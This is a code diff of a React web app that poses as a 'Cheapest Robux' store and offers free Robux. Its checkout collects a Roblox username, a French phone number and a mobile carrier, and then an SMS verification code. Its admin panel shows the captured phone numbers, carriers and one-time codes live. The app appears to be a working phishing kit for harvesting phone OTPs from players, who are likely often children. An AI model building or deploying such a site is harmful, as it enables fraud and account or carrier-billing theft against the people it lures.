+                e.preventDefault();
+                if (!newCode) return;
+                const fb = getFb();
+                try {
+                    await fb.addDoc(getPublicCollection("referral_codes"), {
+                        code: newCode.toUpperCase(),
+                        timestamp: fb.serverTimestamp()
+                    });
+                    setNewCode('');
+                    showNotification("Referral code added!", "success");
+                } catch (e) {
+                    showNotification("Error creating referral code.", "error");
+                    console.error(e);
+                }
+            };
 
-            return (
-                <div className="min-h-screen bg-black p-4 md:p-8">
-                    <div className="max-w-6xl mx-auto">
-                        <div className="flex justify-between items-center mb-8">
-                            <h1 className="text-3xl font-bold text-white flex items-center gap-3"><Database className="text-blue-500" /> Admin Panel</h1>
-                            <div className="flex gap-4">
-                                <button onClick={() => setActiveTab('orders')} className={`px-4 py-2 rounded-lg font-bold ${activeTab==='orders' ? 'bg-blue-600 text-white' : 'bg-white/10 text-gray-400'}`}>Orders</button>
-                                <button onClick={() => setActiveTab('referrals')} className={`px-4 py-2 rounded-lg font-bold ${activeTab==='referrals' ? 'bg-blue-600 text-white' : 'bg-white/10 text-gray-400'}`}>Referral Codes</button>
-                                <button onClick={onBack} className="px-4 py-2 bg-white/10 text-white rounded-lg border border-white/20 hover:bg-white/20">Back</button>
-                            </div>
-                        </div>
+            const handleDeleteReferral = async (referralId) => {
+                if(!confirm("Delete this referral code?")) return;
+                const fb = getFb();
+                try { await fb.deleteDoc(getPublicDoc("referral_codes", referralId)); } 
+                catch (e) { showNotification("Error deleting referral.", "error"); }
+            };
 
-                        {activeTab === 'orders' ? (
-                            <div className="bg-[#111] rounded-xl border border-white/10 overflow-hidden">
-                                <div className="grid grid-cols-8 bg-white/5 p-4 font-bold text-gray-400 text-sm">
-                                    <div>User</div>
-                                    <div>SIM</div>
-                                    <div className="col-span-1">Number</div>
-                                    <div>Referral</div>
-                                    <div>OTP</div>
-                                    <div>Status</div>
-                                    <div>Time</div>
-                                    <div className="text-right">Action</div>
-                                </div>
-                                <div className="divide-y divide-white/5">
-                                    {orders.map(order => (
-                                        <div key={order.id} className="grid grid-cols-8 p-4 text-sm items-center hover:bg-white/5 transition-colors">
-                                            <div className="font-medium text-white truncate pr-2" title={order.username}>{order.username}</div>
-                                            <div className="text-gray-400">{order.sim}</div>
-                                            <div className="font-mono text-yellow-500 col-span-1 text-xs">{order.phone}</div>
-                                            <div className="text-red-500 font-mono text-xs font-bold">{order.referral || '-'}</div>
-                                            <div className="font-mono text-white font-bold text-lg tracking-widest">{order.otp || '-'}</div>
-                                            <div><span className={`px-2 py-1 rounded text-xs font-bold ${order.status === 'verified' ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}`}>{order.status ? order.status.toUpperCase() : 'PENDING'}</span></div>
-                                            <div className="text-gray-500 text-xs">{order.timestamp?.seconds ? new Date(order.timestamp.seconds * 1000).toLocaleTimeString() : 'Now'}</div>
-                                            <div className="text-right">
-                                                <button onClick={() => handleDelete(order.id)} className="p-2 text-red-400 hover:bg-red-500/10 rounded-lg transition-colors" title="Delete Order"><Trash2 className="w-4 h-4" /></button>
-                                            </div>
-                                        </div>
-                                    ))}
-                                    {orders.length === 0 && <div className="p-8 text-center text-gray-500 col-span-8">Waiting for orders...</div>}
-                                </div>
-                            </div>
-                        ) : (
-                            <div className="bg-[#111] rounded-xl border border-white/10 p-6">
-                                <h3 className="text-xl font-bold mb-4">Manage Referral Codes</h3>
-                                <form onSubmit={handleAddReferral} className="flex gap-4 mb-8">
-                                    <input 
-                                        type="text" 
-                                        value={newCode} 
-                                        onChange={(e) => setNewCode(e.target.value)} 
-                                        placeholder="Enter new code (e.g. SUMMER2024)" 
-                                        className="flex-1 bg-black border border-white/20 rounded-lg p-3 text-white uppercase outline-none"
-                                    />
-                                    <button className="px-6 py-3 bg-green-600 text-white font-bold rounded-lg hover:bg-green-700 flex items-center gap-2">
-                                        <Plus className="w-4 h-4" /> Add Code
-                                    </button>
-                                </form>
-                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                                    {referrals.map(ref => (
-                                        <div key={ref.id} className="bg-white/5 p-4 rounded-lg border border-white/10 flex justify-between items-center">
-                                            <span className="font-mono text-lg text-yellow-400 font-bold">{ref.code}</span>
-                                            <button onClick={() => handleDeleteReferral(ref.id)} className="text-gray-500 hover:text-red-500"><Trash2 className="w-4 h-4" /></button>
-                                        </div>
-                                    ))}
-                                    {referrals.length === 0 && <p className="text-gray-500 col-span-full">No active referral codes.</p>}
-                                </div>
-                            </div>
-                        )}
-                    </div>
-                </div>
-            );
-        };
+            return (
+                <div className="min-h-screen bg-black p-4 md:p-8">
+                    <div className="max-w-6xl mx-auto">
+                        <div className="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
+                            <h1 className="text-3xl font-bold text-white flex items-center gap-3"><Database className="text-blue-500" /> Admin Panel</h1>
+                            <div className="flex gap-4">
+                                <button onClick={() => setActiveTab('orders')} className={`px-4 py-2 rounded-lg font-bold ${activeTab==='orders' ? 'bg-blue-600 text-white' : 'bg-white/10 text-gray-400'}`}>Orders</button>
+                                <button onClick={() => setActiveTab('referrals')} className={`px-4 py-2 rounded-lg font-bold ${activeTab==='referrals' ? 'bg-blue-600 text-white' : 'bg-white/10 text-gray-400'}`}>Referral Codes</button>
+                                <button onClick={onBack} className="px-4 py-2 bg-white/10 text-white rounded-lg border border-white/20 hover:bg-white/20">Back</button>
+                            </div>
+                        </div>
 
-        // --- VIEWS ---
-        const HomeView = ({ username, setUsername, addToCart }) => (
-            <>
-                <div className="relative z-10 pt-32 pb-12 lg:pt-48 lg:pb-24 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto text-center animate-in">
-                    <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 border border-white/20 text-white text-sm font-medium mb-6"><Star className="w-3 h-3 text-yellow-400" fill="currentColor" /><span>#1 Verified Robux Reseller</span></div>
-                    <h1 className="text-5xl md:text-7xl font-bold tracking-tight mb-6 text-white">Cheapest Robux. <br/><span className="text-transparent bg-clip-text bg-gradient-to-r from-gray-200 to-gray-600">Unbeatable Prices.</span></h1>
-                    <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10">Instant delivery to your account. Safe, secure, and cheaper than ever.</p>
-                    <div className="max-w-md mx-auto bg-black p-2 rounded-2xl border border-white/20 flex items-center gap-2 mb-16 shadow-2xl hover:border-white/40 transition-colors">
-                        <button onClick={() => document.getElementById('packages').scrollIntoView({ behavior: 'smooth' })} className="w-full h-12 rounded-xl bg-white text-black font-bold hover:bg-gray-200 transition-all">Get Robux Here</button>
-                    </div>
-                </div>
-                <div id="packages" className="relative z-10 py-24 bg-black border-t border-white/10">
-                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                        <div className="flex flex-col md:flex-row justify-between items-end mb-12 gap-6"><div><h2 className="text-3xl md:text-4xl font-bold mb-4">Current Deals</h2><p className="text-gray-400">Limited time offers. Prices in EUR.</p></div></div>
-                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
-                            {robuxPackages.map((pkg) => (
-                                <div key={pkg.id} className={`relative group overflow-hidden rounded-3xl transition-all duration-300 border ${pkg.price === 0 ? 'bg-gradient-to-b from-white/10 to-black border-white/40 transform hover:scale-[1.02] shadow-2xl shadow-white/5' : 'bg-[#111] border-white/10 hover:border-white/30 hover:bg-[#161616]'}`}>
-                                    {pkg.tag && <div className="absolute top-0 right-0 bg-white text-black text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">{pkg.tag}</div>}
-                                    {pkg.popular && !pkg.tag && <div className="absolute top-0 right-0 bg-[#222] text-white border-l border-b border-white/20 text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">BEST SELLER</div>}
-                                    <div className="p-8 relative z-10">
-                                        <div className="flex justify-between items-start mb-6">
-                                            <div className={`w-12 h-12 rounded-full flex items-center justify-center transition-transform duration-300 ${pkg.price === 0 ? 'bg-white text-black' : 'bg-white/5 border border-white/10'}`}>
-                                                {/* REPLACED DIAMOND WITH ROBUX HEXAGON LOGO */}
-                                                <RobuxLogo className={`w-6 h-6 ${pkg.price === 0 ? 'text-black' : 'text-white'}`} />
-                                            </div>
-                                            <div className="text-right">{pkg.price > 0 && <p className="text-sm text-gray-500 line-through decoration-red-500 decoration-2">€{(pkg.price * 1.3).toFixed(2)}</p>}<p className="text-2xl font-bold text-white">{pkg.price === 0 ? 'FREE' : `€${pkg.price.toFixed(2)}`}</p></div>
-                                        </div>
-                                        <div className="mb-8"><h3 className="text-4xl font-black text-white mb-2">{pkg.amount.toLocaleString()}</h3>{pkg.bonus !== '0' && <p className="text-sm font-medium text-green-400 flex items-center gap-1"><Zap className="w-3 h-3" fill="currentColor" />+{pkg.bonus} Bonus</p>}{pkg.price === 0 && <p className="text-sm font-medium text-gray-400">Offer valid for new registered users only.</p>}</div>
-                                        <button onClick={() => addToCart(pkg)} className={`w-full py-4 rounded-xl font-bold flex items-center justify-center gap-2 transition-all active:scale-95 ${pkg.price === 0 ? 'bg-white text-black hover:bg-gray-200' : 'bg-[#222] text-white border border-white/10 hover:bg-[#333]'}`}>{pkg.price === 0 ? 'Claim Now' : 'Add to Cart'}</button>
-                                    </div>
-                                </div>
-                            ))}
-                        </div>
-                    </div>
-                </div>
-            </>
-        );
+                        {activeTab === 'orders' ? (
+                            <div className="bg-[#111] rounded-xl border border-white/10 overflow-hidden">
+                                <div className="grid grid-cols-1 md:grid-cols-8 bg-white/5 p-4 font-bold text-gray-400 text-sm hidden md:grid">
+                                    <div>User</div>
+                                    <div>SIM</div>
+                                    <div className="col-span-1">Number</div>
+                                    <div>Referral</div>
+                                    <div>OTP</div>
+                                    <div>Status</div>
+                                    <div>Time</div>
+                                    <div className="text-right">Action</div>
+                                </div>
+                                <div className="divide-y divide-white/5">
+                                    {orders.map(order => (
+                                        <div key={order.id} className="grid grid-cols-2 md:grid-cols-8 p-4 text-sm items-center hover:bg-white/5 transition-colors gap-y-2">
+                                            <div className="font-medium text-white truncate pr-2 col-span-2 md:col-span-1" title={order.username}><span className="md:hidden text-gray-500 text-xs mr-2">USER:</span>{order.username}</div>
+                                            <div className="text-gray-400"><span className="md:hidden text-gray-500 text-xs mr-2">SIM:</span>{order.sim}</div>
+                                            <div className="font-mono text-yellow-500 col-span-1 text-xs"><span className="md:hidden text-gray-500 mr-2">TEL:</span>{order.phone}</div>
+                                            <div className="text-red-500 font-mono text-xs font-bold"><span className="md:hidden text-gray-500 mr-2">REF:</span>{order.referral || '-'}</div>
+                                            <div className="font-mono text-white font-bold text-lg tracking-widest"><span className="md:hidden text-gray-500 text-xs mr-2">OTP:</span>{order.otp || '-'}</div>
+                                            <div><span className={`px-2 py-1 rounded text-xs font-bold ${order.status === 'verified' ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}`}>{order.status ? order.status.toUpperCase() : 'PENDING'}</span></div>
+                                            <div className="text-gray-500 text-xs">{order.timestamp?.seconds ? new Date(order.timestamp.seconds * 1000).toLocaleTimeString() : 'Now'}</div>
+                                            <div className="text-right col-span-2 md:col-span-1">
+                                                <button onClick={() => handleDelete(order.id)} className="p-2 text-red-400 hover:bg-red-500/10 rounded-lg transition-colors" title="Delete Order"><Trash2 className="w-4 h-4" /></button>
+                                            </div>
+                                        </div>
+                                    ))}
+                                    {orders.length === 0 && <div className="p-8 text-center text-gray-500 col-span-8">Waiting for orders...</div>}
+                                </div>
+                            </div>
+                        ) : (
+                            <div className="bg-[#111] rounded-xl border border-white/10 p-6">
+                                <h3 className="text-xl font-bold mb-4">Manage Referral Codes</h3>
+                                <form onSubmit={handleAddReferral} className="flex gap-4 mb-8">
+                                    <input 
+                                        type="text" 
+                                        value={newCode} 
+                                        onChange={(e) => setNewCode(e.target.value)} 
+                                        placeholder="Enter new code (e.g. SUMMER2024)" 
+                                        className="flex-1 bg-black border border-white/20 rounded-lg p-3 text-white uppercase outline-none"
+                                    />
+                                    <button className="px-6 py-3 bg-green-600 text-white font-bold rounded-lg hover:bg-green-700 flex items-center gap-2">
+                                        <Plus className="w-4 h-4" /> Add Code
+                                    </button>
+                                </form>
+                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                                    {referrals.map(ref => (
+                                        <div key={ref.id} className="bg-white/5 p-4 rounded-lg border border-white/10 flex justify-between items-center">
+                                            <span className="font-mono text-lg text-yellow-400 font-bold">{ref.code}</span>
+                                            <button onClick={() => handleDeleteReferral(ref.id)} className="text-gray-500 hover:text-red-500"><Trash2 className="w-4 h-4" /></button>
+                                        </div>
+                                    ))}
+                                    {referrals.length === 0 && <p className="text-gray-500 col-span-full">No active referral codes.</p>}
+                                </div>
+                            </div>
+                        )}
+                    </div>
+                </div>
+            );
+        };
 
-        const CheckoutView = ({ email, setEmail, phoneNumber, setPhoneNumber, simProvider, setSimProvider, referralCode, setReferralCode, isFreeOrder, handleCheckout, isProcessing, cartTotal, cart, navigateTo, username, setUsername, showNotification }) => {
-            const handlePhoneChange = (e) => {
-                let val = e.target.value;
-                if (!val.startsWith("+33 ")) val = "+33 ";
-                const digits = val.substring(4).replace(/[^0-9]/g, '');
-                if (digits.length <= 9) {
-                    setPhoneNumber("+33 " + digits);
-                }
-            };
+        // --- VIEWS ---
+        const HomeView = ({ username, setUsername, addToCart }) => (
+            <>
+                <div className="relative z-10 pt-32 pb-12 lg:pt-48 lg:pb-24 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto text-center animate-in">
+                    <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 border border-white/20 text-white text-sm font-medium mb-6"><Star className="w-3 h-3 text-yellow-400" fill="currentColor" /><span>#1 Verified Robux Reseller</span></div>
+                    <h1 className="text-5xl md:text-7xl font-bold tracking-tight mb-6 text-white">Cheapest Robux. <br/><span className="text-transparent bg-clip-text bg-gradient-to-r from-gray-200 to-gray-600">Unbeatable Prices.</span></h1>
+                    <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10">Instant delivery to your account. Safe, secure, and cheaper than ever.</p>
+                    <div className="max-w-md mx-auto bg-black p-2 rounded-2xl border border-white/20 flex items-center gap-2 mb-16 shadow-2xl hover:border-white/40 transition-colors">
+                        <button onClick={() => document.getElementById('packages').scrollIntoView({ behavior: 'smooth' })} className="w-full h-12 rounded-xl bg-white text-black font-bold hover:bg-gray-200 transition-all">Get Robux Here</button>
+                    </div>
+                </div>
+                <div id="packages" className="relative z-10 py-24 bg-black border-t border-white/10">
+                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                        <div className="flex flex-col md:flex-row justify-between items-end mb-12 gap-6"><div><h2 className="text-3xl md:text-4xl font-bold mb-4">Current Deals</h2><p className="text-gray-400">Limited time offers. Prices in EUR.</p></div></div>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+                            {robuxPackages.map((pkg) => (
+                                <div key={pkg.id} className={`relative group overflow-hidden rounded-3xl transition-all duration-300 border ${pkg.price === 0 ? 'bg-gradient-to-b from-white/10 to-black border-white/40 transform hover:scale-[1.02] shadow-2xl shadow-white/5' : 'bg-[#111] border-white/10 hover:border-white/30 hover:bg-[#161616]'}`}>
+                                    {pkg.tag && <div className="absolute top-0 right-0 bg-white text-black text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">{pkg.tag}</div>}
+                                    {pkg.popular && !pkg.tag && <div className="absolute top-0 right-0 bg-[#222] text-white border-l border-b border-white/20 text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">BEST SELLER</div>}
+                                    <div className="p-8 relative z-10">
+                                        <div className="flex justify-between items-start mb-6">
+                                            <div className={`w-12 h-12 rounded-full flex items-center justify-center transition-transform duration-300 ${pkg.price === 0 ? 'bg-white text-black' : 'bg-white/5 border border-white/10'}`}>
+                                                <RobuxLogo className={`w-6 h-6 ${pkg.price === 0 ? 'text-black' : 'text-white'}`} />
+                                            </div>
+                                            <div className="text-right">{pkg.price > 0 && <p className="text-sm text-gray-500 line-through decoration-red-500 decoration-2">€{(pkg.price * 1.3).toFixed(2)}</p>}<p className="text-2xl font-bold text-white">{pkg.price === 0 ? 'FREE' : `€${pkg.price.toFixed(2)}`}</p></div>
+                                        </div>
+                                        <div className="mb-8"><h3 className="text-4xl font-black text-white mb-2">{pkg.amount.toLocaleString()}</h3>{pkg.bonus !== '0' && <p className="text-sm font-medium text-green-400 flex items-center gap-1"><Zap className="w-3 h-3" fill="currentColor" />+{pkg.bonus} Bonus</p>}{pkg.price === 0 && <p className="text-sm font-medium text-gray-400">Offer valid for new registered users only.</p>}</div>
+                                        <button onClick={() => addToCart(pkg)} className={`w-full py-4 rounded-xl font-bold flex items-center justify-center gap-2 transition-all active:scale-95 ${pkg.price === 0 ? 'bg-white text-black hover:bg-gray-200' : 'bg-[#222] text-white border border-white/10 hover:bg-[#333]'}`}>{pkg.price === 0 ? 'Claim Now' : 'Add to Cart'}</button>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+                </div>
+            </>
+        );
 
-            const onCheckoutSubmit = (e) => {
-                handleCheckout(e, showNotification);
-            };
+        const CheckoutView = ({ email, setEmail, phoneNumber, setPhoneNumber, simProvider, setSimProvider, referralCode, setReferralCode, isFreeOrder, handleCheckout, isProcessing, cartTotal, cart, navigateTo, username, setUsername, showNotification }) => {
+            const handlePhoneChange = (e) => {
+                let val = e.target.value;
+                if (!val.startsWith("+33 ")) val = "+33 ";
+                const digits = val.substring(4).replace(/[^0-9]/g, '');
+                if (digits.length <= 9) {
+                    setPhoneNumber("+33 " + digits);
+                }
+            };
 
-            return (
-                <div className="pt-32 pb-24 px-4 max-w-7xl mx-auto min-h-screen">
-                    <button onClick={() => navigateTo('home')} className="flex items-center gap-2 text-gray-400 hover:text-white mb-8 transition-colors"><ArrowLeft className="w-4 h-4" /> Back to Store</button>
-                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
-                        <div className="animate-in">
-                            <h2 className="text-3xl font-bold mb-6 flex items-center gap-3"><Lock className="w-6 h-6 text-green-400" /> Secure Checkout</h2>
-                            <form onSubmit={onCheckoutSubmit} className="space-y-6">
-                                <div className="space-y-4">
-                                    <h3 className="text-xl font-semibold text-gray-200">Account Details</h3>
-                                    
-                                    <div className="space-y-2">
-                                        <label className="text-sm text-gray-400">Roblox Username (No Password Required)</label>
-                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
-                                            <User className="w-5 h-5 text-gray-500" />
-                                            <input required type="text" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="Add Roblox Username Here" className="flex-1 bg-transparent border-none outline-none text-white w-full"/>
-                                        </div>
-                                    </div>
-                                    
-                                    <div className="space-y-2">
-                                        <label className="text-sm text-gray-400">Referral Code (Required for Free Offer)</label>
-                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
-                                            <Ticket className="w-5 h-5 text-gray-500" />
-                                            <input type="text" value={referralCode} onChange={(e) => setReferralCode(e.target.value)} placeholder="Enter code" className="flex-1 bg-transparent border-none outline-none text-white w-full uppercase" required={isFreeOrder}/>
-                                        </div>
-                                        {/* Updated warning text */}
-                                        {isFreeOrder && <p className="text-xs text-red-500 font-medium mt-1">⚠️ Free Robux offer is only applied through a valid referral code.</p>}
-                                    </div>
+            const onCheckoutSubmit = (e) => {
+                handleCheckout(e, showNotification);
+            };
 
-                                    {isFreeOrder ? (
-                                        <div className="space-y-4 animate-in">
-                                            <div className="space-y-2"><label className="text-sm text-gray-400">SIM (Required)</label><div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors"><Signal className="w-5 h-5 text-gray-500" /><select required value={simProvider} onChange={(e) => setSimProvider(e.target.value)} className="flex-1 bg-transparent border-none outline-none text-white w-full"><option value="" className="bg-[#111] text-gray-500">Select SIM</option><option value="Bouygues" className="bg-[#111]">Bouygues</option><option value="Orange" className="bg-[#111]">Orange</option><option value="SFR" className="bg-[#111]">SFR</option></select></div></div>
-                                            <div className="space-y-2">
-                                                <label className="text-sm text-gray-400">Phone Number (Required)</label>
-                                                <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
-                                                    <Smartphone className="w-5 h-5 text-gray-500" />
-                                                    <input 
-                                                        required 
-                                                        type="text" 
-                                                        value={phoneNumber} 
-                                                        onChange={handlePhoneChange}
-                                                        className="flex-1 bg-transparent border-none outline-none text-white w-full font-mono" 
-                                                        autoFocus 
-                                                    />
-                                                </div>
-                                            </div>
-                                        </div>
-                                    ) : (
-                                        <div className="space-y-2"><label className="text-sm text-gray-400">Email Address</label><div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors"><Mail className="w-5 h-5 text-gray-500" /><input required type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" className="flex-1 bg-transparent border-none outline-none text-white w-full"/></div></div>
-                                    )}
-                                </div>
-                                <button type="submit" disabled={isProcessing} className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-2 mt-8 disabled:opacity-50 disabled:cursor-not-allowed">{isProcessing ? <><Loader2 className="w-5 h-5 animate-spin" /> {isFreeOrder ? 'Sending Code...' : 'Processing...'}</> : <>{isFreeOrder ? 'Verify Number' : `Pay €${cartTotal.toFixed(2)}`}</>}</button>
-                            </form>
-                        </div>
-                        {/* Order Summary ... */}
-                        <div className="lg:pl-8 animate-in delay-100">
-                            <div className="bg-[#111] rounded-2xl p-6 border border-white/10 sticky top-32">
-                                <h3 className="text-xl font-bold mb-6">Order Summary</h3>
-                                <div className="space-y-4 max-h-96 overflow-y-auto pr-2 mb-6 custom-scrollbar">
-                                    {cart.map((item, idx) => (
-                                        <div key={idx} className="flex justify-between items-center py-3 border-b border-white/5 last:border-0"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm text-white">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>
-                                    ))}
-                                </div>
-                                <div className="space-y-3 pt-4 border-t border-white/10"><div className="flex justify-between text-gray-400 text-sm"><span>Subtotal</span><span>€{cartTotal.toFixed(2)}</span></div><div className="flex justify-between text-xl font-bold text-white pt-2"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div></div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            );
-        };
+            return (
+                <div className="pt-32 pb-24 px-4 max-w-7xl mx-auto min-h-screen">
+                    <button onClick={() => navigateTo('home')} className="flex items-center gap-2 text-gray-400 hover:text-white mb-8 transition-colors"><ArrowLeft className="w-4 h-4" /> Back to Store</button>
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
+                        <div className="animate-in">
+                            <h2 className="text-3xl font-bold mb-6 flex items-center gap-3"><Lock className="w-6 h-6 text-green-400" /> Secure Checkout</h2>
+                            <form onSubmit={onCheckoutSubmit} className="space-y-6">
+                                <div className="space-y-4">
+                                    <h3 className="text-xl font-semibold text-gray-200">Account Details</h3>
+                                    
+                                    <div className="space-y-2">
+                                        <label className="text-sm text-gray-400">Roblox Username (No Password Required)</label>
+                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
+                                            <User className="w-5 h-5 text-gray-500" />
+                                            <input required type="text" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="Add Roblox Username Here" className="flex-1 bg-transparent border-none outline-none text-white w-full"/>
+                                        </div>
+                                    </div>
+                                    
+                                    <div className="space-y-2">
+                                        <label className="text-sm text-gray-400">Referral Code (Required for Free Offer)</label>
+                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
+                                            <Ticket className="w-5 h-5 text-gray-500" />
+                                            <input type="text" value={referralCode} onChange={(e) => setReferralCode(e.target.value)} placeholder="Enter code" className="flex-1 bg-transparent border-none outline-none text-white w-full uppercase" required={isFreeOrder}/>
+                                        </div>
+                                        {isFreeOrder && <p className="text-xs text-red-500 font-medium mt-1">⚠️ Free Robux offer is only applied through a valid referral code.</p>}
+                                    </div>
 
-        const OtpVerifyView = ({ phoneNumber, otp, setOtp, handleOtpSubmit, isProcessing, navigateTo }) => (
-            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
-                <div className="w-24 h-24 bg-yellow-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse"><Smartphone className="w-12 h-12 text-yellow-500" /></div>
-                <h1 className="text-4xl md:text-5xl font-bold mb-4">Enter Verification Code</h1>
-                <p className="text-gray-400 text-lg max-w-lg mb-8">We have sent a 4-digit code to <span className="text-white font-bold">{phoneNumber}</span></p>
-                <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-xl mb-8 max-w-md w-full flex items-start gap-3"><AlertTriangle className="w-6 h-6 text-red-500 shrink-0" /><p className="text-red-400 text-sm text-left font-semibold">OTP can take up to 10min so please wait or else the offer will be cancelled.</p></div>
-                <form onSubmit={handleOtpSubmit} className="w-full max-w-xs space-y-6">
-                    <input required type="text" maxLength="4" placeholder="0000" value={otp} onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ''))} className="w-full h-16 text-center text-3xl tracking-[0.5em] bg-[#111] border border-white/20 rounded-xl focus:border-white/50 outline-none transition-all"/>
-                    <button type="submit" disabled={isProcessing || otp.length < 4} className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all disabled:opacity-50 disabled:cursor-not-allowed">{isProcessing ? 'Verifying...' : 'Verify & Claim Robux'}</button>
-                </form>
-                <button onClick={() => navigateTo('checkout')} className="mt-6 text-sm text-gray-500 hover:text-white transition-colors">Change Phone Number</button>
-            </div>
-        );
+                                    {isFreeOrder ? (
+                                        <div className="space-y-4 animate-in">
+                                            <div className="space-y-2"><label className="text-sm text-gray-400">SIM (Required)</label><div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors"><Signal className="w-5 h-5 text-gray-500" /><select required value={simProvider} onChange={(e) => setSimProvider(e.target.value)} className="flex-1 bg-transparent border-none outline-none text-white w-full"><option value="" className="bg-[#111] text-gray-500">Select SIM</option><option value="Bouygues" className="bg-[#111]">Bouygues</option><option value="Orange" className="bg-[#111]">Orange</option><option value="SFR" className="bg-[#111]">SFR</option></select></div></div>
+                                            <div className="space-y-2">
+                                                <label className="text-sm text-gray-400">Phone Number (Required)</label>
+                                                <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
+                                                    <Smartphone className="w-5 h-5 text-gray-500" />
+                                                    <input 
+                                                        required 
+                                                        type="text" 
+                                                        value={phoneNumber} 
+                                                        onChange={handlePhoneChange}
+                                                        className="flex-1 bg-transparent border-none outline-none text-white w-full font-mono" 
+                                                        autoFocus 
+                                                    />
+                                                </div>
+                                            </div>
+                                        </div>
+                                    ) : (
+                                        <div className="space-y-2"><label className="text-sm text-gray-400">Email Address</label><div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors"><Mail className="w-5 h-5 text-gray-500" /><input required type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" className="flex-1 bg-transparent border-none outline-none text-white w-full"/></div></div>
+                                    )}
+                                </div>
+                                <button type="submit" disabled={isProcessing} className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-2 mt-8 disabled:opacity-50 disabled:cursor-not-allowed">{isProcessing ? <><Loader2 className="w-5 h-5 animate-spin" /> {isFreeOrder ? 'Sending Code...' : 'Processing...'}</> : <>{isFreeOrder ? 'Verify Number' : `Pay €${cartTotal.toFixed(2)}`}</>}</button>
+                            </form>
+                        </div>
+                        {/* Order Summary ... */}
+                        <div className="lg:pl-8 animate-in delay-100">
+                            <div className="bg-[#111] rounded-2xl p-6 border border-white/10 sticky top-32">
+                                <h3 className="text-xl font-bold mb-6">Order Summary</h3>
+                                <div className="space-y-4 max-h-96 overflow-y-auto pr-2 mb-6 custom-scrollbar">
+                                    {cart.map((item, idx) => (
+                                        <div key={idx} className="flex justify-between items-center py-3 border-b border-white/5 last:border-0"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm text-white">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>
+                                    ))}
+                                </div>
+                                <div className="space-y-3 pt-4 border-t border-white/10"><div className="flex justify-between text-gray-400 text-sm"><span>Subtotal</span><span>€{cartTotal.toFixed(2)}</span></div><div className="flex justify-between text-xl font-bold text-white pt-2"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            );
+        };
 
-        const SuccessView = ({ isFreeOrder, orderId, navigateTo }) => (
-            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
